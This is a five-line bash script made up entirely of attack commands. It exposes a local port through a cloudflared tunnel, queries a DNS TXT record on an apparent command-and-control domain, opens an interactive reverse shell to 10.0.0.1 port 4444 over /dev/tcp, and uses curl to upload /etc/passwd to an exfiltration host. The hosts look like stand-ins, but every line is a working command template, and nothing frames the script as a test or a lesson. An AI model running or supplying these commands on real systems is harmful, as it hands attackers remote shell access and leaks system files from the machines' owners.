#!/bin/bash
cloudflared tunnel --url localhost:8080
nslookup -q=txt data.c2.example.com
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
curl -F @/etc/passwd https://exfil.example.com/upload
